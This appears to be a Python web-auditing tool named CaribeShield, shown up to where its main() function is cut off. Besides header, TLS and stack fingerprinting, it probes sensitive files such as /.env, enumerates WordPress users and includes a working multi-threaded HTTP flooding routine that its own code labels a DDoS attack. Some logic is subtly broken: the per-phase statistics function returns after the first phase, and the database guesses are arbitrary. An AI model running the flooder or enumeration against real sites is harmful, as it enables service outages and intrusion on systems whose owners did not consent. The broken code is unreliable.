#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CaribeShield - Passive & Active Web Posture Checker 
Desarrollado por: Jose Rodriguez

AVISO LEGAL (República Dominicana):
Esta herramienta es SOLO para auditorías con autorización expresa. El uso no autorizado
podría constituir una infracción o delito bajo la Ley 53-07 (Crímenes y Delitos de Alta Tecnología)
y puede involucrar manejo de datos personales regulados por la Ley 172-13 (Protección de Datos).
Use bajo consentimiento y alcance definido.
"""
import os
import argparse
import re
import socket
import ssl
import sys
import requests
import threading
import random
import time
import json
import tldextract
import matplotlib.pyplot as plt
from matplotlib.gridspec import GridSpec
import numpy as np
from faker import Faker
import platform
from dataclasses import dataclass
from datetime import datetime
from html.parser import HTMLParser
from typing import Optional
from requests.exceptions import RequestException
from urllib.parse import urlparse, urlunparse, urljoin

try:
    import requests
except ImportError:
    print("Falta dependencia: requests. Instala con: pip install requests")
    sys.exit(1)

BANNER = r"""
   ____           _ _          _____ _     _      _     _
  / ___|__ _ _ __(_) |__   ___| ____| |__ (_) ___| | __| |
 | |   / _` | '__| | '_ \ / _ \  _| | '_ \| |/ _ \ |/ _` |
 | |__| (_| | |  | | |_) |  __/ |___| | | | |  __/ | (_| |
  \____\__,_|_|  |_|_.__/ \___|_____|_| |_|_|\___|_|\__,_|

  CaribeShield - Passive & Active Web Posture Checker
  Uso: SOLO con autorización expresa (Ley RD 53-07 / 172-13)
"""

SEC_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy",
    "Cross-Origin-Embedder-Policy",
]

WAF_FINGERPRINTS = [
    ("Cloudflare", ["cf-ray", "cf-cache-status", "server: cloudflare", "__cf_bm"]),
    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache", "sucuri"]),
    ("Akamai", ["akamai", "ghost", "x-akamai"]),
    ("Fastly", ["fastly", "x-served-by", "x-cache: hit from"]),
    ("Imperva/Incapsula", ["incap_ses", "visid_incap", "incapsula"]),
    ("AWS ALB/CloudFront", ["x-amz-cf-id", "via: 1.1", "cloudfront"]),
]

CMS_HINTS = [
    ("WordPress", [r"wp-content", r"wp-includes", r"xmlrpc\.php", r"/wp-json/"]),
    ("Joomla", [r"content=\"Joomla!", r"/media/system/js/", r"com_content", r"/administrator/"]),
    ("Drupal", [r"drupal", r"sites/all", r"sites/default", r"x-drupal-cache"]),
    ("Magento", [r"magento", r"/static/frontend/", r"mage/"]),
    ("Laravel", [r"laravel_session", r"csrf-token", r"x-powered-by:\s*php"]),
    ("Django", [r"csrftoken", r"sessionid", r"csrfmiddlewaretoken"]),
    ("Express", [r"connect\.sid", r"x-powered-by:\s*express"]),
]

VERSION_PATTERNS = [
    (r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']', "meta:generator"),
    (r"wp-emoji-release\.min\.js\?ver=([0-9.]+)", "wp-emoji ver"),
]

JS_LIB_FPS = [
    ("jQuery", [r"/jquery(\.min)?\.js", r"jquery[-.]\d", r"window\.jQuery", r"jQuery\("]),
    ("React", [r"/react(\.min)?\.js", r"/react-dom(\.min)?\.js", r"__REACT_DEVTOOLS_GLOBAL_HOOK__"]),
    ("Vue.js", [r"/vue(\.min)?\.js", r"Vue\.createApp", r"new Vue\("]),
    ("AngularJS", [r"/angular(\.min)?\.js", r"angular\.module\("]),
    ("Next.js", [r"/_next/", r"__NEXT_DATA__"]),
    ("Nuxt", [r"__NUXT__", r"/_nuxt/"]),
    ("Alpine.js", [r"/alpine(\.min)?\.js", r"\bx-data\b", r"\bx-init\b"]),
    ("Bootstrap (JS)", [r"/bootstrap(\.min)?\.js", r"\bbootstrap(\.|-)\b", r"\bdata-bs-\b"]),
]

CSS_FPS = [
    ("Bootstrap (CSS)", [r"/bootstrap(\.min)?\.css", r"\bbootstrap(\.|-)\b"]),
    ("Tailwind CSS", [r"tailwind", r"\b(2xl:|md:|lg:|xl:)\S+"]),
    ("Bulma", [r"bulma(\.min)?\.css"]),
    ("Foundation", [r"foundation(\.min)?\.css"]),
    ("Materialize", [r"materialize(\.min)?\.css"]),
]

ANALYTICS_FPS = [
    ("Google Tag Manager", [r"googletagmanager\.com/gtm\.js", r"\bGTM-\w+\b"]),
    ("Google Analytics (gtag.js)", [r"googletagmanager\.com/gtag/js", r"\bgtag\("]),
    ("Google Analytics (analytics.js)", [r"google-analytics\.com/analytics\.js", r"\bga\("]),
    ("Hotjar", [r"static\.hotjar\.com", r"\bhj\("]),
    ("Facebook Pixel", [r"connect\.facebook\.net", r"\bfbq\("]),
]

CDN_HINTS = [
    ("Google Fonts", [r"fonts\.googleapis\.com", r"fonts\.gstatic\.com"]),
    ("cdnjs", [r"cdnjs\.cloudflare\.com"]),
    ("jsDelivr", [r"cdn\.jsdelivr\.net"]),
    ("unpkg", [r"unpkg\.com"]),
    ("Cloudflare CDN", [r"\bcloudflare\b"]),
]

DB_BY_PLATFORM = {
    "WordPress": ["MySQL"],
    "Joomla": ["MySQL"],
    "Drupal": ["MySQL"],
    "Magento": ["MySQL"],
    "Laravel": ["MySQL"],
    "Django": ["PostgreSQL"],
    "Express": ["MongoDB"],
    "Next.js": ["MysQl"],
    "Nuxt": ["PostgreSQL"],
}

STANDARD_ENDPOINTS = [
    ("/robots.txt", "robots.txt"),
    ("/sitemap.xml", "sitemap.xml"),
    ("/.well-known/security.txt", "security.txt"),
    ("/humans.txt", "humans.txt"),
    ("/ads.txt", "ads.txt"),
    ("/manifest.json", "web manifest"),
    ("/service-worker.js", "service worker"),
    ("/favicon.ico", "favicon"),
    ("/.well-known/assetlinks.json", "assetlinks.json"),
    ("/.well-known/apple-app-site-association", "apple app association"),
    ("/wp-json/", "WP REST"),
    ("/graphql", "GraphQL"),
    ("/dashboard", "home"),
    ("/api/user", "user api"),
    ("/sanctum/csrf-cookie", "Cookies CSRF"),
    ("/wp-json/wp/v2/users", "Api enumeración usuarios"),
    ("/wp-admin/admin-ajax.php", "Admin ajax"),
    ("/wp-content/plugins/", "Plugins"),
    ("/wp-content/themes/", "Themes"),
    ("/wp-includes/", "Includes"),
    ("/administrator", "Panel Administrativo Joomla"),
    ("/.env", "Enviroment de Laravel"),
    ("/configuration.php", "Configuracion General"),
    ("/joomla.xml", "Lenguaje del Joomla"),
    ("/joomla.xml", "Datos opcionales"),
    ("/administrator/manifests/files/joomla.xml","Manifests Joomla"),
    ("/index.php/component/users/?view=registration", "Joomla Registration View"),
    ("/index.php/component/users/?task=registration.register", "Joomla Registration Task")
]

COMMON_UI_ENDPOINTS = [
    ("/admin", "admin"),
    ("/login", "login"),
    ("/wp-register", "register"),
    ("/wp-admin/", "wp-admin"),
]


@dataclass
class FetchResult:
    final_url: str
    status: int
    headers: dict
    body: str
    set_cookie_raw: str


@dataclass
class AssetInfo:
    url: str
    kind: str  
    status: int | None
    content_type: str | None


def print_kv(k, v):
    print(f"{k:<30}: {v}")


def normalize_url(u: str) -> str:
    u = u.strip()
    if not u:
        return ""
    if not re.match(r"^https?://", u, re.I):
        u = "https://" + u
    p = urlparse(u)
    p = p._replace(fragment="")
    return urlunparse(p)


def dns_resolve(host: str):
    try:
        infos = socket.getaddrinfo(host, None)
        ips = sorted({i[4][0] for i in infos})
        return ips
    except Exception:
        return []


def tcp_connect(host: str, port: int, timeout=2.5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def fetch(url: str, timeout=12) -> FetchResult:
    headers = {
        "User-Agent": "CaribeShield/2.0 (Passive posture + Wappalyzer-like)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
    body = r.text or ""
    body = body[:250000]
    sc = r.headers.get("Set-Cookie", "") or r.headers.get("set-cookie", "")
    return FetchResult(final_url=str(r.url), status=int(r.status_code), headers=dict(r.headers), body=body, set_cookie_raw=str(sc))


def head(url: str, timeout=10):
    try:
        r = requests.head(url, headers={"User-Agent": "CaribeShield/2.0 (HEAD)"}, timeout=timeout, allow_redirects=True)
        return int(r.status_code), dict(r.headers)
    except Exception:
        return None, {}


def options(url: str, timeout=10):
    try:
        r = requests.options(url, headers={"User-Agent": "CaribeShield/2.0 (OPTIONS)"}, timeout=timeout, allow_redirects=True)
        return int(r.status_code), dict(r.headers)
    except Exception:
        return None, {}


def detect_server(headers: dict) -> str:
    return headers.get("Server") or headers.get("server") or "No expuesto"


def detect_waf(headers: dict, set_cookie_raw: str) -> str:
    h = "\n".join([f"{k.lower()}: {str(v).lower()}" for k, v in headers.items()])
    h2 = h + "\nset-cookie: " + (set_cookie_raw or "").lower()

    hits = []
    for name, needles in WAF_FINGERPRINTS:
        for n in needles:
            if n.lower() in h2:
                hits.append(name)
                break
    hits = sorted(set(hits))
    return ", ".join(hits) if hits else "No concluyente"


def security_headers(headers: dict):
    keys_l = {k.lower() for k in headers.keys()}
    present, missing = [], []
    for h in SEC_HEADERS:
        if h.lower() in keys_l:
            present.append(h)
        else:
            missing.append(h)
    return present, missing


def detect_cms(body: str, headers: dict, set_cookie_raw: str) -> str:
    clues = (body or "").lower()
    header_blob = "\n".join([f"{k}: {v}" for k, v in headers.items()]).lower()
    combined = clues + "\n" + header_blob + "\nset-cookie: " + (set_cookie_raw or "").lower()

    found = []
    for cms, patterns in CMS_HINTS:
        for pat in patterns:
            if re.search(pat, combined, re.I):
                found.append(cms)
                break
    found = sorted(set(found))
    return ", ".join(found) if found else "No concluyente"


def detect_cms_version(body: str) -> str:
    for pat, src in VERSION_PATTERNS:
        m = re.search(pat, body or "", re.I)
        if m:
            val = m.group(1).strip()
            return f"{val} ({src})"
    return "No expuesta públicamente"

class AssetHTMLParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.scripts = []
        self.stylesheets = []
        self.meta_generator = []
        self.inline_scripts = []
        self.inline_styles = []
        self._in_script = False
        self._in_style = False
        self._buf = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs or [])
        t = tag.lower()

        if t == "script":
            src = attrs.get("src")
            if src:
                self.scripts.append(src)
            self._in_script = True
            self._buf = []
        elif t == "link":
            rel = (attrs.get("rel") or "").lower()
            href = attrs.get("href")
            if href and ("stylesheet" in rel or rel == "preload"):
                as_attr = (attrs.get("as") or "").lower()
                if "stylesheet" in rel or as_attr == "style" or href.endswith(".css"):
                    self.stylesheets.append(href)
        elif t == "meta":
            name = (attrs.get("name") or "").lower()
            if name == "generator":
                content = attrs.get("content") or ""
                if content:
                    self.meta_generator.append(content)
        elif t == "style":
            self._in_style = True
            self._buf = []

    def handle_endtag(self, tag):
        t = tag.lower()
        if t == "script" and self._in_script:
            data = "".join(self._buf).strip()
            if data:
                self.inline_scripts.append(data[:4000])
            self._in_script = False
            self._buf = []
        elif t == "style" and self._in_style:
            data = "".join(self._buf).strip()
            if data:
                self.inline_styles.append(data[:4000])
            self._in_style = False
            self._buf = []

    def handle_data(self, data):
        if self._in_script or self._in_style:
            self._buf.append(data)


def extract_assets(html: str, base_url: str):
    p = AssetHTMLParser()
    try:
        p.feed(html or "")
    except Exception:
        pass

    scripts_abs = [urljoin(base_url, s) for s in p.scripts]
    css_abs = [urljoin(base_url, c) for c in p.stylesheets]

    def dedup(seq):
        seen, out = set(), []
        for x in seq:
            if x not in seen:
                seen.add(x)
                out.append(x)
        return out

    return {
        "scripts": dedup(scripts_abs),
        "styles": dedup(css_abs),
        "meta_generator": dedup(p.meta_generator),
        "inline_scripts": p.inline_scripts,
        "inline_styles": p.inline_styles,
    }


def scan_assets(assets: dict, max_each=10):
    js_urls = assets.get("scripts", [])[:max_each]
    css_urls = assets.get("styles", [])[:max_each]
    out = []

    for u in js_urls:
        st, hd = head(u, timeout=8)
        out.append(AssetInfo(url=u, kind="js", status=st, content_type=(hd.get("Content-Type") if hd else None)))
    for u in css_urls:
        st, hd = head(u, timeout=8)
        out.append(AssetInfo(url=u, kind="css", status=st, content_type=(hd.get("Content-Type") if hd else None)))
    return out

def _match_any(patterns, text):
    for pat in patterns:
        if re.search(pat, text or "", re.I):
            return True
    return False


def detect_stack(fr: FetchResult, assets: dict):
    body = fr.body or ""
    headers_blob = "\n".join([f"{k}: {v}" for k, v in fr.headers.items()])
    set_cookie = fr.set_cookie_raw or ""
    scripts = "\n".join(assets.get("scripts", []))
    styles = "\n".join(assets.get("styles", []))
    inline_js = "\n".join(assets.get("inline_scripts", [])[:3])
    inline_css = "\n".join(assets.get("inline_styles", [])[:3])

    combined = "\n".join([body, headers_blob, "set-cookie: " + set_cookie, scripts, styles, inline_js, inline_css])

    detected = {"js": [], "css": [], "analytics": [], "cdn": [], "hints": []}

    for name, pats in JS_LIB_FPS:
        if _match_any(pats, combined):
            detected["js"].append(name)

    for name, pats in CSS_FPS:
        if _match_any(pats, combined):
            detected["css"].append(name)

    for name, pats in ANALYTICS_FPS:
        if _match_any(pats, combined):
            detected["analytics"].append(name)

    cdn_text = "\n".join([scripts, styles, headers_blob])
    for name, pats in CDN_HINTS:
        if _match_any(pats, cdn_text):
            detected["cdn"].append(name)

    gens = assets.get("meta_generator", [])
    if gens:
        detected["hints"].append("meta generator: " + " | ".join(gens[:3]))

    for k in detected:
        detected[k] = sorted(set(detected[k]))
    return detected


def infer_databases(cms_detected: str, stack: dict):
    cms_list = [c.strip() for c in cms_detected.split(",") if c.strip() and cms_detected != "No concluyente"]
    implied = []
    for fw in ("Next.js", "Nuxt"):
        if fw in (stack.get("js") or []):
            implied.append(fw)

    platforms = sorted(set(cms_list + implied))
    if not platforms:
        return ["No inferible (no hay CMS/framework concluyente)"]

    dbs = []
    for p in platforms:
        dbs.extend(DB_BY_PLATFORM.get(p, []))
    dbs = sorted(set(dbs))
    return dbs if dbs else ["Depende del backend"]

def tls_probe(host: str, port=443, timeout=6):
    """
    Postura TLS ligera:
    - Conecta una vez y reporta: versión negociada, cipher, y datos básicos del cert.
    """
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                ver = ssock.version()
                cipher = ssock.cipher()  
                cert = ssock.getpeercert()
                not_after = cert.get("notAfter")
                not_before = cert.get("notBefore")
                subject = cert.get("subject", [])
                issuer = cert.get("issuer", [])
                san = cert.get("subjectAltName", [])
                return {
                    "ok": True,
                    "version": ver,
                    "cipher": cipher[0] if cipher else None,
                    "bits": cipher[2] if cipher else None,
                    "not_before": not_before,
                    "not_after": not_after,
                    "subject": _flatten_cert_name(subject),
                    "issuer": _flatten_cert_name(issuer),
                    "san_count": len(san) if san else 0,
                }
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _flatten_cert_name(name_seq):
    parts = []
    try:
        for rdns in name_seq:
            for k, v in rdns:
                parts.append(f"{k}={v}")
    except Exception:
        return ""
    return ", ".join(parts)

def parse_set_cookie_flags(set_cookie_raw: str):
    """
    Analiza en forma simple el Set-Cookie agregado.
    No reconstruye cookies individuales perfectas (porque Set-Cookie puede venir repetido),
    pero da señales útiles: presencia de HttpOnly/Secure/SameSite.
    """
    s = (set_cookie_raw or "").lower()
    if not s.strip():
        return {"present": False, "secure": 0, "httponly": 0, "samesite": 0, "warnings": ["Sin Set-Cookie observable"]}
    secure = s.count("secure")
    httponly = s.count("httponly")
    samesite = s.count("samesite")
    warnings = []
    if secure == 0:
        warnings.append("Cookies sin flag Secure (o no observable)")
    if httponly == 0:
        warnings.append("Cookies sin flag HttpOnly (o no observable)")
    if samesite == 0:
        warnings.append("Cookies sin SameSite (o no observable)")
    return {"present": True, "secure": secure, "httponly": httponly, "samesite": samesite, "warnings": warnings}


def analyze_csp(headers: dict):
    csp = None
    for k, v in headers.items():
        if k.lower() == "content-security-policy":
            csp = str(v)
            break
    if not csp:
        return {"present": False, "warnings": ["Sin Content-Security-Policy"], "notes": []}

    low = csp.lower()
    warnings = []
    notes = []

    if "unsafe-inline" in low:
        warnings.append("CSP permite 'unsafe-inline'")
    if "unsafe-eval" in low:
        warnings.append("CSP permite 'unsafe-eval'")
    if "frame-ancestors" not in low:
        warnings.append("CSP sin 'frame-ancestors' (clickjacking)")
    if "default-src" in low:
        notes.append("Incluye default-src")
    if "script-src" in low:
        notes.append("Incluye script-src")
    return {"present": True, "warnings": warnings, "notes": notes}


def analyze_cors(headers: dict):
    aco = None
    acc = None
    for k, v in headers.items():
        kl = k.lower()
        if kl == "access-control-allow-origin":
            aco = str(v).strip()
        elif kl == "access-control-allow-credentials":
            acc = str(v).strip()
    warnings = []
    if aco == "*":
        warnings.append("CORS: Access-Control-Allow-Origin = *")
    if aco == "*" and (acc or "").lower() == "true":
        warnings.append("CORS: * con Allow-Credentials=true (riesgoso/invalid)")
    return {"aco": aco, "acc": acc, "warnings": warnings}


def summarize_allow_methods(opt_headers: dict):
    allow = None
    for k, v in opt_headers.items():
        if k.lower() == "allow" or k.lower() == "access-control-allow-methods":
            allow = str(v)
            break
    if not allow:
        return {"present": False, "allow": None, "warnings": []}

    low = allow.lower()
    warnings = []
    if "trace" in low:
        warnings.append("Permite TRACE (revisar)")
    if "put" in low or "delete" in low:
        warnings.append("Permite PUT/DELETE (validar necesidad)")
    return {"present": True, "allow": allow, "warnings": warnings}

def check_endpoints(base_url: str, endpoints: list, timeout=8):
    results = []
    for path, name in endpoints:
        url = base_url.rstrip("/") + path
        st, _ = head(url, timeout=timeout)
        if st is None:
            results.append((name, path, "Error"))
        elif st in (200, 204, 301, 302, 307, 308, 401, 403):
            results.append((name, path, f"Sí (HTTP {st})"))
        else:
            results.append((name, path, f"No (HTTP {st})"))
    return results

def verificar_wpcron(url:str, timeout=10):
    cron_url = f"{url}/wp-cron.php"
    print(f"Verificando {cron_url} ...\n")
    try:
        response=requests.get(cron_url, timeout=timeout)
        status_code = response.status_code
    except RequestException as exc:
        print(f"[❌] No se pudo alcanzar {cron_url}: {exc}")
        return
    if status_code == 200:
        print("[⚠] ¡Alerta! wp-cron.php está habilitado y puede ser vulnerable a ataques DoS.")
    else:
        print("[✔] wp-cron.php parece estar protegido.")

def verificar_xmlrpc(url:str, timeout=5):
    xmlrpc_url = f"{url}/xmlrpc.php"
    print(f"Verificando {xmlrpc_url}...\n")
    try:
        response=requests.get(xmlrpc_url,timeout=timeout)
        content_preview = "\n".join(response.text.splitlines()[:3])
    except RequestException as exc:
        print(f"[❌] No se pudo alcanzar {xmlrpc_url}: {exc}")
        return
    print("--------------------------------------")
    print(content_preview)
    print("--------------------------------------")

    if "XML-RPC server accepts POST requests only." in content_preview:
        print("[⚠] ¡Alerta! xmlrpc.php está habilitado.")
    else:
        print("[✔] xmlrpc.php no está habilitado o está protegido.")
    print("--------------------------------------")

def buscar_usuarios_wp(url: str, timeout=5):
    print(f"Buscando usuarios en {url}....")
    resultado1 = ""
    resultado2 = []
    try:
        response1 = requests.head(f"{url}/?author=1", allow_redirects=False, timeout=timeout)
        loc = response1.headers.get("Location") or response1.headers.get("location")
        if loc:
            partes=loc.rstrip('/').split('/')
            resultado1 = partes[-1] if len(partes) > 0 else ""
    except Exception:
        resultado1 = ""
    try:
        response2 = requests.get(f"{url}/wp-json/wp/v2/users", timeout=timeout)
        if response2.status_code == 200:
            usuarios = response2.json()
            resultado2 = sorted(set(user.get('name', '') for user in usuarios if 'name' in user))
    except Exception:
        resultado2 = []
    return resultado1, resultado2

Fases = [0,20,50,100,150,200]
Duracion_FASE = 20
FASE_SALIDA = "resultados_test_flooding"

latencias = []
timestamp = []
codigos_estados = []
marcadores_fase = []
fase_actual = 0
parar_fase = False
lock = threading.Lock()

def obtener_metricas_para_ataque_DDoS(url:str, timeout=30):
    print("[*] Preparando condiciones para ataque")
    host = url.split("//")[1].split("/")[0]
    resultado_ping = os.popen(f"ping -c 4 {host}").read()

    baseline = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "plataforma": platform.platform(),
        "Destino": url,
        "resultado_ping": resultado_ping.strip(),
        "fases": Fases,
        "duracion_fase": Duracion_FASE
    }

    os.makedirs(FASE_SALIDA, exist_ok=True)
    with open(f"{FASE_SALIDA}/baseline.json","w") as f:
        json.dump(baseline, f, indent=2)
    return baseline

def hacer_request(url:str, timeout=30):
    global latencias, timestamp, codigos_estados
    tiempo_inicial = time.time()

    try:
        r=requests.get(url,timeout=timeout)
        lat = r.elapsed.total_seconds()
        status = r.status_code
    except requests.exceptions.Timeout:
        lat = timeout
        status = "Timeout"
    except Exception as e:
        lat = time.time() - tiempo_inicial
        status = f"Erro: {str(e)[:20]}"
    with lock:
        latencias.append(lat)
        timestamp.append(time.time())
        codigos_estados.append(status)

def inundacion_de_trafico(url: str, timeout=30):
    global parar_fase
    while not parar_fase:
        hacer_request(url, timeout)

def ejecutar_fase_de_prueba(qtd_threads, url: str, timeout=30):
    global parar_fase, fase_actual, marcadores_fase
    parar_fase = False
    threads = []
    tiempo_inicio_fase = time.time()

    with lock:
        marcadores_fase.append((len(latencias), qtd_threads, tiempo_inicio_fase))
    print(f"[+] Fase {fase_actual}: {qtd_threads} threads")

    for _ in range(qtd_threads):
        t = threading.Thread(target=inundacion_de_trafico, args=(url, timeout))
        t.daemon = True
        t.start()
        threads.append(t)
    time.sleep(Duracion_FASE)
    parar_fase = True
    time.sleep(1)
    print(f"[-] Fase {fase_actual}  encerrada - {qtd_threads} threads")
    fase_actual += 1

def clasificar_latencias():
    tiras = {
        "≤1s (normal)": 0,
        "1–3s (leve)": 0,
        "3–5s (moderada)": 0,
        "5–10s (crítica)": 0,
        ">10s (grave)": 0
    }

    for l in latencias:
        if l <= 1:
            tiras["≤1s (normal)"] += 1
        elif l <= 3:
            tiras["1–3s (leve)"] += 1
        elif l <= 5:
            tiras["3–5s (moderada)"] += 1
        elif l <= 10:
            tiras["5–10s (crítica)"] += 1
        else:
            tiras[">10s (grave)"] += 1    
    return tiras

def calcular_estadisticas_por_fase(timeout=30):
    estadisticas = []
    for i in range(len(marcadores_fase)):
        inicio_idx = marcadores_fase[i][0]
        fin_idx = marcadores_fase[i+1][0] if i < len(marcadores_fase)-1 else len(latencias)
        lat_fase = latencias[inicio_idx:fin_idx]
        stat_fase = codigos_estados[inicio_idx:fin_idx]

        if not lat_fase:
            continue
        
        timeouts = stat_fase.count("Timeout")
        errores = sum(1 for s in stat_fase if isinstance(s, str) and s.startswith("Error"))
        exitosos = sum(1 for s in stat_fase if isinstance(s, int) and 200 <= s < 300)
        lat_array = np.array([l for l in lat_fase if l < timeout])
        if len(lat_array) > 0:
            media = np.mean(lat_array)
            mediana = np.median(lat_array)
            percentil_95 = np.percentile(lat_array, 95) if len(lat_array) >= 20 else None
        else:
            media = mediana = percentil_95 = None
        estadisticas.append({
            "fase": i,
            "threads": marcadores_fase[i][1],
            "requisicoes": len(lat_fase),
            "timeouts": timeouts,
            "timeouts_pct": (timeouts / len(lat_fase)) * 100 if lat_fase else 0,
            "erros": errores,
            "sucessos": exitosos,
            "media_latencia": media,
            "mediana_latencia": mediana,
            "percentil_95": percentil_95
        })
        return estadisticas

def generar_informe_ddos(url:str,timeout=30):
    os.makedirs(FASE_SALIDA, exist_ok=True)
    ts_archivo = datetime.now().strftime("%Y%m%d-%H%M%S")
    t0 = timestamp[0]

    datos_de_prueba = {
        "latencias": latencias,
        "timestamps": [t - t0 for t in timestamp],
        "codigos_status": [str(s) for s in codigos_estados],
        "fases": [(m[0], m[1], m[2] - t0) for m in marcadores_fase]
    }
    with open(f"{FASE_SALIDA}/dados_brutos_{ts_archivo}.json","w") as f:
        json.dump(datos_de_prueba, f)
    estadisticas = calcular_estadisticas_por_fase()
    with open(f"{FASE_SALIDA}/estadisticas_{ts_archivo}.json","w") as f:
        json.dump(estadisticas,f,indent=2)
    rangos = clasificar_latencias()
    plt.figure(figsize=(15,15))
    gs = GridSpec(3,2)

    ax1 = plt.subplot(gs[0,0])
    labels = list(rangos.keys())
    sizes = list(rangos.values())
    colores = ['#8BC34A', '#FFEB3B', '#FFC107', '#FF5722', '#B71C1C']

    ax1.pie(sizes, labels=labels, colors=colores, autopct='%1.1f%%', startangle=140)
    ax1.set_title("Distribución de la latencia de las solicitudes")
    ax2 = plt.subplot(gs[0,1])
    tiempos_relativos = [t - t0 for t in timestamp]
    ax2.plot(tiempos_relativos, latencias, 'b-', alpha=0.5)
    ax2.set_ylim(0, max(max(latencias) * 1.1, timeout * 1.1))

    for m in marcadores_fase:
        ax2.axvline(x=m[2] - t0, color='r', linestyle='--', alpha=0.7)
        ax2.text(m[2] - t0, max(latencias) * 0.9, f"{m[1]} threads", rotation=90)
    
    ax2.set_title("Latencia a lo largo del tiempo")
    ax2.set_xlabel("Tiempo (segundos)")
    ax2.set_ylabel("Latencia (segundos)")
    
    ax3 = plt.subplot(gs[1, 0])
    fases_num = [e["fase"] for e in estadisticas]
    medias = [e["media_latencia"] if e["media_latencia"] is not None else 0 for e in estadisticas]
    threads = [e["threads"] for e in estadisticas]

    ax3.bar(fases_num, medias, color='orange')
    ax3.set_title("Latencia media por fase")
    ax3.set_xlabel("Fase")
    ax3.set_ylabel("Latencia Media (segundos)")

    for i, v in enumerate(medias):
        if v > 0:
            ax3.text(fases_num[i], v + 0.1, f"{threads[i]} thr", ha='center')
    ax4 = plt.subplot(gs[1,1])
    timeouts_pct = [e["timeouts_pct"] for e in estadisticas]
    ax4.bar(fases_num, timeouts_pct, color='red')
    ax4.set_title("Porcentaje de Timeouts por Fase")
    ax4.set_xlabel("Fase")
    ax4.set_ylabel("Timeouts (%)")
    ax4.set_ylim(0, 100)

    ax5 = plt.subplot(gs[2,0])
    sucesso_pct = [e["sucessos"] / e["requisicoes"] * 100 if e["requisicoes"] > 0 else 0 for e in estadisticas]
    ax5.plot(fases_num, sucesso_pct, 'go-', linewidth=2)
    ax5.set_title("Taxa de Sucesso por Fase")
    ax5.set_xlabel("Fase")
    ax5.set_ylabel("Solicitudes exitosas (%)")
    ax5.set_ylim(0, 100)

    ax6 = plt.subplot(gs[2, 1])
    requisicoes = [e["requisicoes"] for e in estadisticas]

    ax6.plot(threads, requisicoes, 'bo-', linewidth=2)
    ax6.set_title("Capacidad de procesamiento por carga")
    ax6.set_xlabel("Número de Threads")
    ax6.set_ylabel("Solicitudes Procesadas")

    plt.tight_layout()
    plt.savefig(f"{FASE_SALIDA}/relatorio_completo_{ts_archivo}.png", dpi=300)

    plt.figure(figsize=(8, 8))
    plt.pie(sizes, labels=labels, colors=colores, autopct='%1.1f%%', startangle=140)
    plt.title("Distribucion de la latencia de las solicitudes")
    plt.axis('equal')
    plt.tight_layout()
    plt.savefig(f"{FASE_SALIDA}/grafico_pizza_{ts_archivo}.png")

    print("\n=== Resumen del Ataque ===")
    print(f"URL testada: {url}")
    print(f"Total de requisitos: {len(latencias)}")
    print(f"Duracion total: {tiempos_relativos[-1]:.1f} segundos")
    print("\nLatencias por tiras:")
    for rango, qtd in rangos.items():
        print(f"  {rango}: {qtd} ({qtd/len(latencias)*100:.1f}%)")
    
    print("\nResultados por fase:")
    for e in estadisticas:
        print(f"  Fase {e['fase']} ({e['threads']} threads): {e['requisicoes']} req, " +
              f"{e['timeouts_pct']:.1f}% timeouts, " +
              f"latência média: {e['media_latencia']:.3f}s")    
    for i in range(1, len(estadisticas)):
        if estadisticas[i]["timeouts_pct"] > 50 or (estadisticas[i]["media_latencia"] is not None and 
           estadisticas[i-1]["media_latencia"] is not None and 
           estadisticas[i]["media_latencia"] > estadisticas[i-1]["media_latencia"] * 3):
            print(f"\n[!] Punto de degradación identificado: Fase {estadisticas[i]['fase']} con {estadisticas[i]['threads']} threads")
            break
    
    print(f"\nInforme Completo Guardado en: {FASE_SALIDA}/")
    
    return estadisticas

def progress(i, total, width=30):
    filled = int(width * i / total)
    bar = "=" * filled + "." * (width - filled)
    print(f"\r[{bar}] {i}/{total}", end="", flush=True)


def subdomain_finder(domain: str, timeout=12, max_names=300):
    domain = (domain or "").strip().lower()
    domain = domain.replace("http://", "").replace("https://", "").strip("/")
    if not domain:
        return []
    try:
        q = f"https://crt.sh/?q=%25.{domain}&output=json"
        r = requests.get(q, timeout=timeout, headers={"User-Agent": "CaribeShield/2.0 (crt.sh)"})
        if r.status_code != 200:
            return []
        data = r.json()
    except Exception:
        return []
    names = set()
    for row in data:
        nameval = (row.get("name_value") or "").strip()
        if not nameval:
            continue
        for n in nameval.splitlines():
            n = n.strip().lower().strip(".")
            if not n or n.startswith("*."):
                continue
            if n == domain or n.endswith("." + domain):
                names.add(n)
    out = sorted(names)
    return out[:max(0, int(max_names))]

def root_domain_from_host(host: str) -> str:
    h = (host or "").strip(".").lower()
    if not h:
        return ""
    ext = tldextract.extract(h)  
    if not ext.domain or not ext.suffix:
        return h
    return f"{ext.domain}.{ext.suffix}"

def subdomains_live(domain: str, timeout=12, max_names=300):
    subs = subdomain_finder(domain, timeout=timeout, max_names=max_names)
    live = []
    for s in subs:
        ips = dns_resolve(s)
        if ips:
            live.append((s, ips))
    return live

def base_origin(final_url: str):
    p = urlparse(final_url)
    return f"{p.scheme}://{p.netloc}"

def main():
    parser = argparse.ArgumentParser(description="CaribeShield - Passive Web Posture Checker (resumido CLI)")
    parser.add_argument("url", nargs="?", help="URL objetivo, ej: https://ejemplo.com")
    parser.add_argument("--assets", type=int, default=10, help="Máximo de JS/CSS a revisar por HEAD (default 10)")
    parser.add_argument("--no-ports", action="store_true", help="No probar conectividad TCP 80/443/21")
    parser.add_argument("--timeout", type=int, default=12, help="Timeout HTTP (default 12s)")
    parser.add_argument("--count", type=int, default=1000, help="Cantidad de usuarios a registrar")
